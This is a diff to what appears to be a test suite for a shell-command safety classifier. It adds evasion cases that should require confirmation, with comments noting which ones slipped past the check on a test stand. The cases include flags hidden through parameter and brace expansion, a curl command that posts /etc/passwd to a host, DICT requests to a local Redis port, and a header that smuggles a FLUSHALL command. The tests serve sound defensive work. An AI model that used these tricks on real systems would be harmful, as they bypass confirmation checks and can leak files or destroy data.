@@ -163,6 +163,33 @@ NEEDS_CONFIRMATION = [
     "ip -net ns1 l s eth0 down",
     "ip -lo 1 l s eth0 down",
     "ip -unknownflag l s eth0 down",
+    # third pass, automated review after the push (12.10.2026)
+    "sed p ${X:--i} /tmp/f",                 # edited the file in place on the stand
+    'sed p "${X:--i}" /tmp/f',
+    "sed p {-i,/tmp/f}",
+    "dmesg ${X:--C}",
+    "find /tmp -maxdepth 1 ${X:--delete}",
+    "find ${HOME:--delete} -maxdepth 1",
+    "find $HOME -maxdepth 1 $HOMEDIR",
+    "dpkg ${X:--P} nginx",
+    "sort ${X:--o/tmp/x} /etc/hostname",
+    "journalctl ${X:---rotate}",
+    "git log {--output=/tmp/x,-1}",
+    "git log ${X:---output=/tmp/x} -1",
+    "docker compose config -o /tmp/x",
+    "docker compose config --output=/tmp/x",
+    "docker compose config -qo /tmp/x",
+    "uptime >&1x",                           # created a file named 1x on the stand
+    "uptime >/dev/nullx",
+    "curl --expand-output /tmp/x http://x/",  # wrote /tmp/x with curl 8.10 on the stand
+    "curl --expand-data @/etc/passwd http://x/",
+    "curl --ssl-sessions /tmp/x https://x/",
+    "curl --request-target / http://x/",
+    "curl --max-ti 1 -XPOST http://x/",
+    "curl --resolve dict.x:6379:127.0.0.1 dict.x:6379/info",  # DICT with curl 8.10
+    "curl --proto-d dict 127.0.0.1:6379/info",
+    "curl -s '{dict,www}.x:6379/info'",
+    "curl -H 'X: a\nFLUSHALL' http://x/",
 ]
 
 READS = [
@@ -266,6 +293,18 @@ READS = [
     "ip -s -s link",
     "ip -c=never -br a",
     "ip -n ns1 a",
+    "docker ps --format {{.Names}}",
+    "docker compose config --services",
+    "curl -s --max-time 5 --compressed https://x/",
+    "curl -s --resolve x:443:1.2.3.4 https://x/",
+    "curl -s -w %{http_code} -o /dev/null http://x/",
+    "curl -s --no-progress-meter http://x/",
+    "curl -s example.com/dictionary",
+    "sed -n '$p' /etc/hostname",
+    "find $HOME/www -maxdepth 2 -type f -name '*.zip'",
+    "find ${HOME}/www -maxdepth 1",
+    'docker inspect x --format "{{range $k,$v := .Config.Labels}}{{$k}} {{end}}"',
+    "uptime 2>/dev/null; uptime 2>&1 | head -1",
     "sed -n '1p' /etc/hostname 2>/dev/null",
     "curl -so /dev/null -w '%{http_code}' http://x/ 2>/dev/null",
 ]
